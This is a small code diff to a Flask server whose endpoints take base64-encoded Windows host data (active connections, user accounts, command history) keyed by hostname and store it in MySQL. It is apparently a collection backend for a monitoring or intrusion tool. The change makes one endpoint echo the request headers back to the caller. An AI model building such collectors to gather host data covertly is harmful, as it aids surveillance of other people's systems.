@@ -134,6 +134,7 @@ def user_accountsboi(hostname, value):
 
 @app.route('/api/windows/upd/<hostname>/active_connections/<value>')
 def active_connectionsboi(hostname, value):
+    headers = flask.request.headers
     hostname = str(hostname)
     value = str(value)
     insertValue = base64.b64decode(value).decode('utf-8')
@@ -145,7 +146,7 @@ def active_connectionsboi(hostname, value):
         cursor.close()
     except mysql.connector.Error as error:
         return("Failed: {}".format(error))
-    return "DABALYOU"
+    return headers
 
 @app.route('/api/windows/upd/<hostname>/command_history/<value>')
 def command_historyboi(hostname, value):
